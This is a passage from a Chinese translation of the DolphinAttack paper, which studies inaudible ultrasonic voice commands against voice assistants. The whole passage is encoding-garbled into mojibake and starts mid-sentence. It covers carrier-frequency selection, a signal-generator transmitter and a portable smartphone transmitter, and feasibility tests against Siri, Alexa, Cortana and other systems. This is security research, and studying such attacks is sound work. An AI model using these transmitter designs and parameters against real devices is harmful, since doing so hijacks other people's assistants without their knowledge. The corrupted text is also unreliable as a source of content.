kHzï¼Œä»¥ç¡®ä¿å¬ä¸è§ã€‚å‡è®¾è¯­éŸ³å‘½ä»¤çš„é¢‘ç‡èŒƒå›´ä¸ºwï¼Œåˆ™è½½æ³¢é¢‘ç‡fcå¿…é¡»æ»¡è¶³fc-w&gt; 20 kHzçš„æ¡ä»¶ã€‚ä¾‹å¦‚ï¼Œå‡è®¾åŸºå¸¦çš„å¸¦å®½ä¸º6 kHzï¼Œåˆ™è½½æ³¢é¢‘ç‡å¿…é¡»å¤§äº26 kHzï¼Œä»¥ç¡®ä¿æœ€ä½é¢‘ç‡å¤§äº20 kHzã€‚äººä»¬å¯èƒ½ä¼šè€ƒè™‘ä½¿ç”¨20 kHzä»¥ä¸‹çš„è½½æ³¢ï¼Œå› ä¸ºè¿™äº›é¢‘ç‡å¯¹äºå¤§å¤šæ•°äººæ¥è¯´æ˜¯å¬ä¸åˆ°çš„ï¼Œé™¤äº†å°å­©ã€‚ä½†æ˜¯ï¼Œè¿™æ ·çš„è½½æ³¢ï¼ˆä¾‹å¦‚ï¼Œï¼œ20kHzï¼‰å°†æ— æ•ˆã€‚è¿™æ˜¯å› ä¸ºï¼Œå½“è½½æ³¢é¢‘ç‡å’Œä¸‹è¾¹å¸¦ä½äºä½é€šæ»¤æ³¢å™¨çš„æˆªæ­¢é¢‘ç‡æ—¶ï¼Œå®ƒä»¬å°†ä¸ä¼šè¢«æ»¤æ³¢ã€‚å› æ­¤ï¼Œæ¢å¤çš„è¯­éŸ³ä¸åŒäºåŸå§‹ä¿¡å·ï¼Œå¹¶ä¸”è¯­éŸ³è¯†åˆ«ç³»ç»Ÿå°†æ— æ³•è¯†åˆ«å‘½ä»¤ã€‚ ç±»ä¼¼äºè®¸å¤šç”µå­è®¾å¤‡ï¼Œéº¦å…‹é£æ˜¯é¢‘ç‡é€‰æ‹©æ€§çš„ï¼Œä¾‹å¦‚ï¼Œå„ç§é¢‘ç‡ä¸‹çš„å¢ç›Šä¼šå˜åŒ–ã€‚ä¸ºäº†æé«˜æ•ˆç‡ï¼Œè½½æ³¢é¢‘ç‡åº”æ˜¯æ‰¬å£°å™¨å’ŒVCSéº¦å…‹é£ä¸Šå¢ç›Šæœ€é«˜çš„ä¹˜ç§¯ã€‚ä¸ºäº†å‘ç°æœ€ä½³è½½æ³¢é¢‘ç‡ï¼Œæˆ‘ä»¬æµ‹é‡æ‰¬å£°å™¨å’Œéº¦å…‹é£çš„é¢‘ç‡å“åº”ï¼Œå³ï¼Œåœ¨ç›¸åŒçš„æ¿€åŠ±ä¸‹ï¼Œæˆ‘ä»¬æµ‹é‡å„ç§é¢‘ç‡ä¸‹çš„è¾“å‡ºå¹…åº¦ã€‚å›¾10æ˜¾ç¤ºäº†Samsung Galaxy S6 Edge 3ä¸Šçš„ADMP 401 MEMSéº¦å…‹é£å’Œæ‰¬å£°å™¨çš„é¢‘ç‡å“åº”ã€‚éº¦å…‹é£å’Œæ‰¬å£°å™¨çš„å¢ç›Šä¸ä¸€å®šéšé¢‘ç‡çš„å¢åŠ è€Œé™ä½ï¼Œå› æ­¤æœ‰æ•ˆè½½æ³¢é¢‘ç‡å¯èƒ½ä¸ä¼šå•è°ƒã€‚ï¼ˆ3ï¼‰è¯­éŸ³é€‰æ‹©ã€‚ å„ç§å£°éŸ³æ˜ å°„åˆ°å„ç§åŸºå¸¦é¢‘ç‡èŒƒå›´ã€‚ ä¾‹å¦‚ï¼Œå¥³æ€§è¯­éŸ³é€šå¸¸å…·æœ‰æ¯”ç”·æ€§è¯­éŸ³æ›´å®½çš„é¢‘å¸¦ï¼Œè¿™å¯¼è‡´åœ¨å¯å¬é¢‘ç‡èŒƒå›´å†…é¢‘ç‡æ³„æ¼çš„å¯èƒ½æ€§æ›´å¤§ï¼Œå³ï¼Œè°ƒåˆ¶ä¿¡å·çš„æœ€ä½é¢‘ç‡å¯ä»¥å°äº20kHzã€‚ å› æ­¤ï¼Œå¦‚æœå¯èƒ½ï¼Œåº”é€‰æ‹©å¸¦å®½è¾ƒå°çš„è¯­éŸ³ä»¥åˆ›å»ºåŸºå¸¦è¯­éŸ³ä¿¡å· 4.3 è¯­éŸ³å‘½ä»¤å‘é€å™¨æˆ‘ä»¬è®¾è®¡äº†ä¸¤ä¸ªå‘å°„å™¨ï¼šï¼ˆaï¼‰ç”±ä¸“ç”¨ä¿¡å·å‘ç”Ÿå™¨é©±åŠ¨çš„å¼ºå¤§å‘å°„å™¨ï¼ˆå¦‚å›¾5æ‰€ç¤ºï¼‰ï¼Œä»¥åŠï¼ˆbï¼‰ç”±æ™ºèƒ½æ‰‹æœºé©±åŠ¨çš„ä¾¿æºå¼å‘å°„å™¨ï¼ˆå¦‚å›¾11æ‰€ç¤ºï¼‰ã€‚ æˆ‘ä»¬åˆ©ç”¨ç¬¬ä¸€ä¸ªæ¥éªŒè¯å’Œé‡åŒ–DolphinAttackå¯ä»¥å®Œæˆå„ç§å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤çš„ç¨‹åº¦ï¼Œè€Œæˆ‘ä»¬ä½¿ç”¨ç¬¬äºŒä¸ªæ¥éªŒè¯æ­¥è¡Œæ”»å‡»çš„å¯è¡Œæ€§ã€‚ è¿™ä¸¤ä¸ªå‘å°„æœºå‡ç”±ä¸‰ä¸ªç»„ä»¶ç»„æˆï¼šä¿¡å·æºï¼Œè°ƒåˆ¶å™¨å’Œæ‰¬å£°å™¨ã€‚ ä¿¡å·æºäº§ç”ŸåŸå§‹è¯­éŸ³å‘½ä»¤çš„åŸºå¸¦ä¿¡å·ï¼Œå¹¶è¾“å‡ºåˆ°è°ƒåˆ¶å™¨ï¼Œè¯¥è°ƒåˆ¶å™¨ä»¥å¹…åº¦è°ƒåˆ¶ï¼ˆAMï¼‰çš„å½¢å¼å°†è¯­éŸ³ä¿¡å·è°ƒåˆ¶åˆ°é¢‘ç‡ä¸ºfcçš„è½½æ³¢ä¸Šã€‚ æœ€åï¼Œæ‰¬å£°å™¨å°†è°ƒåˆ¶åçš„ä¿¡å·è½¬æ¢æˆå£°æ³¢ï¼Œå¹¶è¯·æ³¨æ„æ‰¬å£°å™¨çš„é‡‡æ ·ç‡å¿…é¡»å¤§äº2ï¼ˆfc + wï¼‰ï¼Œä»¥é¿å…ä¿¡å·æ··å ã€‚ 4.3.1 å…·æœ‰ä¿¡å·å‘ç”Ÿå™¨çš„å¼ºå¤§å˜é€å™¨æˆ‘ä»¬å°†æ™ºèƒ½æ‰‹æœºç”¨ä½œä¿¡å·æºï¼Œå¹¶å°†å›¾5ä¸­æè¿°çš„çŸ¢é‡ä¿¡å·å‘ç”Ÿå™¨ç”¨ä½œè°ƒåˆ¶å™¨ã€‚è¯·æ³¨æ„ï¼Œä¿¡å·å‘ç”Ÿå™¨çš„é‡‡æ ·èŒƒå›´ä¸º300 MHzï¼Œè¿œå¤§äºè¶…å£°é¢‘ç‡ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨é¢„å®šä¹‰çš„å‚æ•°è°ƒåˆ¶ä¿¡å·ã€‚åŠŸèƒ½å¼ºå¤§çš„å‘å°„å™¨çš„æ‰¬å£°å™¨æ˜¯åä¸ºVifa [9]çš„å®½å¸¦åŠ¨æ€è¶…å£°æ‰¬å£°å™¨ã€‚ 4.3.2 å¸¦æœ‰æ™ºèƒ½æ‰‹æœºçš„ä¾¿æºå¼å˜é€å™¨ä¾¿æºå¼å‘å°„å™¨åˆ©ç”¨æ™ºèƒ½æ‰‹æœºæ¥å‘å°„è°ƒåˆ¶ä¿¡å·ã€‚å› ä¸ºæˆ‘ä»¬å‘ç°è®¸å¤šè®¾å¤‡çš„æœ€ä½³è½½æ³¢é¢‘ç‡éƒ½å¤§äº24 kHzï¼Œå¦‚è¡¨3æ‰€ç¤ºã€‚ å¤§å¤šæ•°æ™ºèƒ½æ‰‹æœºæ— æ³•å®Œæˆä»»åŠ¡ã€‚å¤§å¤šæ•°æ™ºèƒ½æ‰‹æœºæœ€å¤šæ”¯æŒ48 kHzé‡‡æ ·ç‡ï¼Œå¹¶ä¸”åªèƒ½å‘é€è½½æ³¢é¢‘ç‡æœ€é«˜ä¸º24 kHzçš„è°ƒåˆ¶çª„å¸¦ä¿¡å·ã€‚ä¸ºäº†æ„å»ºé€‚ç”¨äºå„ç§VCSçš„ä¾¿æºå¼å‘å°„å™¨ï¼Œæˆ‘ä»¬è´­ä¹°äº†ä¸‰æ˜ŸGalaxy S6 Edgeï¼Œå®ƒæ”¯æŒé«˜è¾¾192 kHzçš„é‡‡æ ·ç‡ã€‚ä¸å¹¸çš„æ˜¯ï¼Œä¸‰æ˜ŸGalaxy S6çš„è½¦è½½æ‰¬å£°å™¨ä¼šè¡°å‡é¢‘ç‡å¤§äº20 kHzçš„ä¿¡å·ã€‚ä¸ºäº†å‡è½»è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä½¿ç”¨çª„å¸¦è¶…å£°æ¢èƒ½å™¨[56]ä½œä¸ºæ‰¬å£°å™¨ï¼Œå¹¶åœ¨è¶…å£°æ¢èƒ½å™¨ä¹‹å‰æ·»åŠ äº†ä¸€ä¸ªæ”¾å¤§å™¨ï¼Œå¦‚å›¾11æ‰€ç¤ºã€‚è¿™æ ·ï¼Œæœ‰æ•ˆçš„æ”»å‡»èŒƒå›´å¾—ä»¥æ‰©å±•ã€‚ 5 VCSçš„å¯è¡Œæ€§å®éªŒæˆ‘ä»¬åœ¨16ç§æµè¡Œçš„è¯­éŸ³å¯æ§ç³»ç»Ÿå’Œ7ç§è¯­éŸ³è¯†åˆ«ç³»ç»Ÿä¸Šé€šè¿‡å®éªŒéªŒè¯äº†DolphinAttackï¼Œå¹¶å¯»æ±‚ä»¥ä¸‹ä¸‰ä¸ªé—®é¢˜çš„ç­”æ¡ˆï¼šï¼ˆaï¼‰æ”»å‡»æ˜¯å¦ä¼šé’ˆå¯¹å„ç§æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶å¹³å°ä¸Šçš„ä¸åŒè¯­éŸ³è¯†åˆ«ç³»ç»Ÿèµ·ä½œç”¨ï¼Ÿ ï¼ˆbï¼‰ä¸åŒçš„è½¯ä»¶å’Œç¡¬ä»¶å¦‚ä½•å½±å“æ”»å‡»çš„æ€§èƒ½ï¼Ÿ ï¼ˆcï¼‰æˆåŠŸå®æ–½æ”»å‡»çš„å…³é”®å‚æ•°æ˜¯ä»€ä¹ˆï¼Ÿ æœ¬éƒ¨åˆ†è¯¦ç»†ä»‹ç»äº†å®éªŒè®¾è®¡ï¼Œè®¾ç½®å’Œç»“æœã€‚ 5.1 ç³»ç»Ÿé€‰æ‹©æˆ‘ä»¬æ£€æŸ¥äº†é’ˆå¯¹å„ç§å…ˆè¿›çš„è¯­éŸ³è¯†åˆ«ç³»ç»Ÿå’Œç°æˆçš„VCSçš„DolphinAttackæ”»å‡»ï¼Œè¿™äº›æ”»å‡»å·²åœ¨Tab 3.ä¸­åˆ—å‡ºã€‚ è¯¥åˆ—è¡¨å¹¶éæ—¨åœ¨è¯¦å°½æ— é—ï¼Œè€Œæ˜¯æä¾›äº†ä¸€ç»„å…·æœ‰ä»£è¡¨æ€§çš„VCSï¼Œå¯ä»¥å°½æˆ‘ä»¬æœ€å¤§çš„åŠªåŠ›è¿›è¡Œå®éªŒã€‚æˆ‘ä»¬é€‰æ‹©ç›®æ ‡ç³»ç»Ÿçš„æ–¹æ³•æ˜¯åŒé‡çš„-è½¯ä»¶å’Œç¡¬ä»¶ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬é€‰æ‹©å¯å…¬å¼€ä½¿ç”¨çš„ä¸»è¦è¯­éŸ³è¯†åˆ«ç³»ç»Ÿï¼Œä¾‹å¦‚Siriï¼ŒGoogle Nowï¼ŒAlexaï¼ŒCortanaç­‰ã€‚ä¸æ™®é€šè½¯ä»¶ä¸åŒï¼ŒSRç³»ç»Ÿï¼ˆå°¤å…¶æ˜¯ä¸“æœ‰ç³»ç»Ÿï¼‰é«˜åº¦ä¾èµ–ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿã€‚ä¾‹å¦‚ï¼Œåªèƒ½åœ¨Appleäº§å“ä¸Šæ‰¾åˆ°å’Œä½¿ç”¨Siriã€‚ Alexaä»…é™äºAmazonè®¾å¤‡ï¼› Cortanaä»…åœ¨Windowsè®¡ç®—æœºä¸Šè¿è¡Œã€‚å°½ç®¡å¦‚æ­¤ï¼Œæˆ‘ä»¬è¿˜æ˜¯é€‰æ‹©äº†ä¸SRç³»ç»Ÿå…¼å®¹çš„ç¡¬ä»¶å¹¶è¿›è¡Œäº†å®éªŒã€‚ä¸ºäº†æ¢ç©¶ç¡¬ä»¶å¯¹æ”»å‡»æ€§èƒ½çš„å½±å“ï¼Œæˆ‘ä»¬æ£€æŸ¥äº†è¿è¡ŒåŒä¸€SRç³»ç»Ÿçš„ä¸åŒç¡¬ä»¶æ¨¡å‹ï¼ˆä¾‹å¦‚ï¼Œå„ä»£iPhoneä¸Šçš„Siriï¼‰å—åˆ°çš„æ”»å‡»ã€‚æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬é€‰æ‹©åœ¨æ´»è·ƒç”¨æˆ·çš„æ¶ˆè´¹å¸‚åœºä¸Šæµè¡Œçš„VCSå’ŒSRç³»ç»Ÿï¼Œå¹¶æ¶µç›–å„ç§åº”ç”¨é¢†åŸŸå’Œä½¿ç”¨åœºæ™¯ã€‚åœ¨æ ‡ç­¾é¡µä¸­ã€‚å‚è§Tab 3.ï¼Œæˆ‘ä»¬æ€»ç»“äº†ç”¨äºå®éªŒçš„æ‰€é€‰VCSï¼Œå¯ä»¥å°†å…¶åˆ†ä¸ºä¸‰ç±»-ä¸ªäººè®¾å¤‡ï¼ˆå¯ç©¿æˆ´è®¾å¤‡ï¼Œæ™ºèƒ½æ‰‹æœºï¼Œå¹³æ¿ç”µè„‘ï¼Œè®¡ç®—æœºï¼‰ï¼Œæ™ºèƒ½å®¶å±…è®¾å¤‡å’Œè½¦è¾†ã€‚ 5.2 å®éªŒè®¾ç½®æˆ‘ä»¬ä½¿ç”¨ç›¸åŒçš„å®éªŒè®¾ç½®å’Œè®¾å¤‡æµ‹è¯•å¯¹æ‰€é€‰è¯­éŸ³å¯æ§ç³»ç»Ÿå’Œè¯­éŸ³è¯†åˆ«ç³»ç»Ÿçš„æ”»å‡»ï¼Œå¹¶åœ¨æ³¨å…¥å…·æœ‰ä¸‰ä¸ªç›®æ ‡çš„ä¸å¯å¬çš„è¯­éŸ³å‘½ä»¤æ—¶æŠ¥å‘Šå…¶è¡Œä¸ºï¼š æ£€æŸ¥æ”»å‡»çš„å¯è¡Œæ€§ã€‚ é‡åŒ–å‚æ•°ä»¥è°ƒæ•´æˆåŠŸçš„æ”»å‡»ã€‚ æµ‹é‡æ”»å‡»æ€§èƒ½ã€‚ è®¾å¤‡ï¼š é™¤éå¦æœ‰è¯´æ˜ï¼Œå¦åˆ™æ‰€æœ‰å®éªŒå‡ä½¿ç”¨é»˜è®¤çš„å®éªŒè®¾å¤‡ï¼šå¦‚å›¾5æ‰€ç¤ºçš„åŠŸèƒ½å¼ºå¤§çš„å‘å°„å™¨ï¼Œå…¶ä¸­åŒ…æ‹¬æ™ºèƒ½æ‰‹æœºä½œä¸ºä¿¡å·æºï¼Œä¿¡å·å‘ç”Ÿå™¨ä½œä¸ºè°ƒåˆ¶å™¨ä»¥åŠåä¸ºVifaçš„å®½å¸¦åŠ¨æ€è¶…å£°æ‰¬å£°å™¨[9]ã€‚ ä½œä¸ºæ‰¬å£°å™¨æ’­æ”¾å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤ã€‚ ç”±äºåŠŸèƒ½å¼ºå¤§çš„å‘å°„å™¨èƒ½å¤Ÿä»¥å¤šç§è½½æ³¢ï¼ˆä»9 kHzåˆ°50 kHzï¼‰å‘å°„ä¿¡å·ï¼Œå› æ­¤æˆ‘ä»¬å°†å…¶ç”¨äºå¯è¡Œæ€§ç ”ç©¶ã€‚ ç›¸æ¯”ä¹‹ä¸‹ï¼Œä¾¿æºå¼å‘å°„æœºä½¿ç”¨çª„å¸¦æ‰¬å£°å™¨ï¼Œå…¶ä¼ è¾“é¢‘ç‡å—åˆ°å¯ç”¨çš„çª„å¸¦æ‰¬å£°å™¨çš„é™åˆ¶ã€‚ åœ¨æˆ‘ä»¬çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„ä¾¿æºå¼å‘å°„æœºå¯ä»¥ä»¥23 kHzï¼Œ25 kHzï¼Œ33 kHzï¼Œ40 kHzå’Œ48 kHzçš„é¢‘ç‡å‘é€ä¿¡å·ã€‚ è®¾å®šï¼šé™¤éå—åˆ°è®¾å¤‡å°ºå¯¸çš„é™åˆ¶ï¼Œå¦åˆ™æˆ‘ä»¬ä¼šå°†é€‰å®šçš„è®¾å¤‡æ”¾åœ¨å°å¼æ”»å‡»è®¾å¤‡å‰é¢ï¼Œå¹¶ä¸”æ¡Œå­ä¸Šçš„è·ç¦»å„ä¸ç›¸åŒï¼Œå¹¶ä¸”è®¾å¤‡éº¦å…‹é£æœå‘æ‰¬å£°å™¨ã€‚å°†è®¾å¤‡å’Œæ‰¬å£°å™¨éƒ½å‡é«˜åˆ°ç›¸åŒçš„é«˜åº¦ï¼ˆå³åœ¨æ¡Œå­ä¸Šæ–¹10å˜ç±³ï¼‰ï¼Œä»¥é¿å…æœºæ¢°è€¦åˆã€‚é™¤å¸¦æœ‰æ±½è½¦çš„æµ‹è¯•å¤–ï¼Œæ‰€æœ‰å®éªŒå‡åœ¨æˆ‘ä»¬çš„å®éªŒå®¤ä¸­è¿›è¡Œï¼Œå¹³å‡èƒŒæ™¯å™ªå£°ä¸º55 dB SPLï¼ˆå£°å‹çº§ï¼‰ï¼Œå¹¶ä¸”æˆ‘ä»¬ç¡®è®¤åœ¨æµ‹è¯•é¢‘æ®µï¼ˆ20 kHz â€“ 50 kHzï¼‰ä¸­æ²¡æœ‰å¹²æ‰°å£°ã€‚æˆ‘ä»¬é€šè¿‡åŠŸèƒ½å¼ºå¤§çš„å‘å°„å™¨æ’­æ”¾å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤ï¼Œå¹¶åœ¨è®¾å¤‡å±å¹•æˆ–è®¾å¤‡å£°å­¦å“åº”ä¸­è§‚å¯Ÿç»“æœã€‚é€šå¸¸ï¼Œè®¾å¤‡ä¸Šå®‰è£…äº†å¤šä¸ªéº¦å…‹é£ä»¥æ‹¾å–æ¥è‡ªå„ä¸ªæ–¹å‘çš„å£°éŸ³ã€‚é€šå¸¸æ‰€æœ‰éº¦å…‹é£éƒ½ç”¨äºè¯­éŸ³è¯†åˆ«ã€‚åœ¨æˆ‘ä»¬çš„å®éªŒä¸­ï¼Œæˆ‘ä»¬ä¸“é—¨æµ‹è¯•äº†æ˜¾ç¤ºæœ€ä½³è§£è°ƒæ•ˆæœçš„è®¾å¤‡ã€‚ è¯­éŸ³å‘½ä»¤ï¼š é’ˆå¯¹ä¸¤ç§ç±»å‹çš„æ”»å‡»ï¼ˆæ¿€æ´»å’Œè¯†åˆ«ï¼‰å‡†å¤‡äº†ä¸¤ç§è¯­éŸ³å‘½ä»¤ã€‚ å¯¹äºé‚£äº›æ”¯æŒè¯­éŸ³æ¿€æ´»çš„ç³»ç»Ÿï¼Œæˆ‘ä»¬å°è¯•ä½¿ç”¨å¬ä¸è§çš„å”¤é†’å•è¯å‘½ä»¤æ¿€æ´»å®ƒä»¬ã€‚ è¦æ£€æŸ¥è¯­éŸ³è¯†åˆ«ç³»ç»Ÿæ˜¯å¦å¯ä»¥æ­£ç¡®è¯†åˆ«å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤ï¼Œæˆ‘ä»¬é€‰æ‹©äº†ä¸€äº›å¯ä»¥ç†è§£çš„è‹±è¯­å‘½ä»¤ï¼Œå¦‚Tab 2ä¸­æ‰€ç¤ºã€‚ ç”±äºæ‰€æœ‰è®¾å¤‡å‡ä¸æ”¯æŒä»»ä½•å‘½ä»¤ï¼Œå› æ­¤æˆ‘ä»¬å‡†å¤‡äº†ä¸€ç»„å‘½ä»¤æ¥è¦†ç›–æ‰€æœ‰è®¾å¤‡ã€‚ å¯¹äºæ¯ä¸ªå‘½ä»¤ï¼Œæˆ‘ä»¬å°è¯•ä¸¤ç§éŸ³é¢‘æ¥æºï¼šæ¥è‡ªTTSå¼•æ“çš„åˆæˆå£°éŸ³ï¼Œä»¥åŠä½œè€…æ‰€è¯´çš„çœŸå®äººç±»å£°éŸ³ã€‚ å£°å‹çº§ï¼šå°½ç®¡ä¸ºæ”»å‡»è€Œäº§ç”Ÿçš„å£°éŸ³æ˜¯äººç±»æ— æ³•å¬åˆ°çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶ä½¿ç”¨è‡ªç”±åœºæµ‹é‡éº¦å…‹é£[50]ä»¥åˆ†è´ä¸ºå•ä½æµ‹é‡å£°å‹çº§ï¼ˆSPLï¼‰ã€‚ åœ¨è·Vifa [9]æ‰¬å£°å™¨10 cmå¤„æµ‹é‡çš„è¶…å£°æ¥æ”¶å£°å‹çº§ä¸º125 dBã€‚ æ”»å‡»ï¼šåœ¨è¯†åˆ«æ”»å‡»ä¸­ï¼ŒSRç³»ç»Ÿæ˜¯äº‹å…ˆæ‰‹åŠ¨æ¿€æ´»çš„ã€‚ åœ¨æ¿€æ´»æ”»å‡»ä¸­ï¼Œä¸å…è®¸ä¸è®¾å¤‡è¿›è¡Œç‰©ç†äº¤äº’ã€‚ ä»…å½“ä»SRç³»ç»Ÿè¯†åˆ«çš„æ–‡æœ¬ä¸æ”»å‡»å‘½ä»¤å®Œå…¨åŒ¹é…æ—¶ï¼Œæ‰è®¤ä¸ºæ”»å‡»æˆåŠŸï¼Œå¹¶ä¸”ä»…è®°å½•è·ç¦»ã€‚ è°ƒåˆ¶å‚æ•°ï¼š æˆ‘ä»¬è®¤ä¸ºè°ƒåˆ¶å‚æ•°å¯èƒ½ä¼šå½±å“æ”»å‡»æ€§èƒ½ã€‚ æˆ‘ä»¬è€ƒè™‘å¹…åº¦è°ƒåˆ¶ä¸­çš„ä¸¤ä¸ªå› ç´ ï¼šè½½æ³¢é¢‘ç‡fcå’Œè°ƒåˆ¶æ·±åº¦ã€‚ ä¸ºäº†é‡åŒ–å…¶å½±å“ï¼Œæˆ‘ä»¬ä½¿ç”¨Google TTSå¼•æ“ä½œä¸ºåŸºå¸¦éŸ³é¢‘æºï¼Œå°†è®¾å¤‡æ”¾ç½®åœ¨è·å®½å¸¦è¶…å£°æ‰¬å£°å™¨Vifa [9] 10 cmå¤„ï¼Œå¹¶æµ‹é‡ä¸‰ä¸ªå€¼ï¼šï¼ˆaï¼‰fc range-è½½æ³¢èŒƒå›´ æˆåŠŸè¿›è¡Œè¯†åˆ«æ”»å‡»ä¸”100ï¼…å‡†ç¡®çš„é¢‘ç‡ã€‚ ï¼ˆbï¼‰ç´ æ•°fc ï¼è§£è°ƒåå±•ç°æœ€é«˜åŸºå¸¦4å¹…åº¦çš„fcã€‚ ï¼ˆcï¼‰AMæ·±åº¦â€”æˆåŠŸè¿›è¡Œè¯†åˆ«æ”»å‡»ä¸”100ï¼…å‡†ç¡®æ—¶ï¼Œåœ¨åŸå§‹fcå¤„çš„è°ƒåˆ¶æ·±åº¦ã€‚ 5.3 å¯è¡Œæ€§ç»“æœTab. 3æ€»ç»“å®éªŒç»“æœã€‚ ä»Tab. 3æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼ŒDolphinAttackå¯ä¸å‡ ä¹æ‰€æœ‰ç»è¿‡æ£€æŸ¥çš„SRç³»ç»Ÿå’Œè®¾å¤‡ä¸€èµ·ä½¿ç”¨ã€‚ ç‰¹åˆ«æ˜¯ï¼ŒSRç³»ç»Ÿå¯ä»¥åœ¨æ‰€æœ‰ç»è¿‡æµ‹è¯•çš„ç¡¬ä»¶ä¸Šæ­£ç¡®è§£é‡Šå¬ä¸åˆ°çš„è¯­éŸ³å‘½ä»¤ï¼Œå¹¶ä¸”åœ¨éœ€è¦æ¿€æ´»çš„æ‰€æœ‰VCSä¸Šéƒ½å¯ä»¥æˆåŠŸæ¿€æ´»ã€‚ ä½†æ˜¯ï¼Œç»“æœç¡®å®è¡¨æ˜ï¼Œè®¾å¤‡å’Œç³»ç»Ÿéœ€è¦å„ç§å‚æ•°æ‰èƒ½å®ç°ç›¸åŒçš„æ”»å‡»æ•ˆæœã€‚ æˆ‘ä»¬è®¨è®ºä»¥ä¸‹ç»“æœï¼šç¡¬ä»¶ä¾èµ–æ€§ï¼šDolphinAttackçš„åŸºæœ¬åŸç†æ˜¯åœ¨æ•°å­—åŒ–ç»„ä»¶ä¹‹å‰æ³¨å…¥å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤ã€‚ å› æ­¤ï¼ŒDolphinAttackçš„å¯è¡Œæ€§åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºéŸ³é¢‘ç¡¬ä»¶ï¼Œè€Œä¸æ˜¯è¯­éŸ³è¯†åˆ«ç³»ç»Ÿã€‚ ä¾‹å¦‚ï¼Œè¿è¡ŒSiriçš„åŒä¸€åˆ¶é€ å•†çš„å„ç§è®¾å¤‡åœ¨æ”»å‡»æˆåŠŸç‡ï¼Œæœ€å¤§æ”»å‡»è·ç¦»å’Œè°ƒåˆ¶å‚æ•°æ–¹é¢æ˜¾ç¤ºå‡ºå¾ˆå¤§çš„å·®å¼‚ã€‚ è¿™æ˜¯å› ä¸ºå„ç§å‹å·é‡‡ç”¨ä¸åŒçš„ç¡¬ä»¶ï¼ˆä¾‹å¦‚ï¼Œéº¦å…‹é£ï¼Œæ”¾å¤§å™¨ï¼Œæ»¤æ³¢å™¨ï¼‰ï¼Œè¿™å¯¼è‡´è¾“å…¥åˆ°ç›¸åŒSRç³»ç»Ÿçš„æ•°å­—åŒ–éŸ³é¢‘å‘ç”Ÿå˜åŒ–ã€‚ æˆ‘ä»¬åœ¨ä¸¤ä¸ªç›¸åŒè®¾å¤‡ï¼ˆiPhone SEï¼‰ä¸Šçš„å®éªŒæ˜¾ç¤ºå‡ºç›¸ä¼¼çš„æ”»å‡»å‚æ•°å’Œç»“æœã€‚ å› æ­¤ï¼Œæ”»å‡»è€…äº‹å…ˆç ”ç©¶ç¡¬ä»¶ä»¥è·å¾—ä»¤äººæ»¡æ„çš„æ”»å‡»ç»“æœæ˜¯å¯è¡Œçš„ã€‚SRç³»ç»Ÿä¾èµ–æ€§ï¼šæˆ‘ä»¬å‘ç°ï¼Œå„ç§SRç³»ç»Ÿå¯èƒ½ä¼šä»¥ä¸åŒæ–¹å¼å¤„ç†ç›¸åŒçš„éŸ³é¢‘ã€‚ æˆ‘ä»¬åœ¨è¿è¡ŒiPhone SEçš„Google Chromeä¸­æµ‹è¯•äº†è¯­éŸ³æœç´¢ã€‚ è¡¨3ä¸­çš„ç»“æœè¡¨æ˜ï¼ŒGoogle Chromeçš„fcèŒƒå›´ä¸Siriå®éªŒä¸­çš„fcèŒƒå›´é‡å ï¼Œè¿™è¡¨æ˜æˆ‘ä»¬çš„æ”»å‡»å–å†³äºç¡¬ä»¶ã€‚ ä½†æ˜¯ï¼Œfcï¼ŒAMæ·±åº¦å’Œè¯†åˆ«è·ç¦»çš„å·®å¼‚æ˜¯ç”±SRç³»ç»Ÿå¼•èµ·çš„è¯†åˆ«ä¸æ¿€æ´»ï¼šæ ¹æ®æ”»å‡»è·ç¦»ï¼Œå„ç§è®¾å¤‡å’ŒSRç³»ç»Ÿå¯¹è¯†åˆ«å’Œæ¿€æ´»æ”»å‡»çš„ååº”å¯èƒ½ä¸åŒã€‚ å¯¹äºæŸäº›è®¾å¤‡ï¼ˆ8ä¸ªè®¾å¤‡ï¼‰ï¼Œå¯ä»¥æ¯”è¯†åˆ«æ”»å‡»æ›´å¤§çš„è·ç¦»å®ç°æ¿€æ´»æ”»å‡»ï¼Œè€Œå¯¹äºå…¶ä»–è®¾å¤‡ï¼ˆ6ä¸ªè®¾å¤‡ï¼‰ï¼ŒæˆåŠŸæ¿€æ´»æ”»å‡»çš„æœ‰æ•ˆèŒƒå›´è¦æ¯”è¯†åˆ«æ”»å‡»å°ã€‚ æ­¤å¤–ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°ï¼Œå¯¹äºè®¸å¤šè®¾å¤‡è€Œè¨€ï¼Œåœ¨æ§åˆ¶å‘½ä»¤ä¹‹å‰é™„åŠ æ¿€æ´»å‘½ä»¤ï¼ˆä¾‹å¦‚â€œ Hey Siriâ€ï¼‰å¯èƒ½ä¼šå¢åŠ æ­£ç¡®è¯†åˆ«çš„å¯èƒ½æ€§ï¼Œè¿™å¯èƒ½æ˜¯å› ä¸ºSRç³»ç»Ÿä¸“é—¨å¯¹æ¿€æ´»å‘½ä»¤è¿›è¡Œäº†è®­ç»ƒï¼Œä½¿ä¹‹æˆä¸ºå¯èƒ½ã€‚ åœ¨å¸¸å¼€æ¨¡å¼ä¸‹è¯†åˆ«ã€‚å‘½ä»¤å¾ˆé‡è¦ï¼š è¯­éŸ³å‘½ä»¤çš„é•¿åº¦å’Œå†…å®¹ä¼šå½±å“æˆåŠŸç‡å’Œæœ€å¤§æ”»å‡»è·ç¦»ã€‚ åœ¨å®éªŒä¸­ï¼Œæˆ‘ä»¬ä¸¥æ ¼è¦æ±‚è¦æ±‚æ­£ç¡®è¯†åˆ«å‘½ä»¤ä¸­çš„æ¯ä¸ªå•è¯ï¼Œå°½ç®¡æŸäº›å‘½ä»¤å¯èƒ½ä¸éœ€è¦è¿™æ ·åšã€‚ 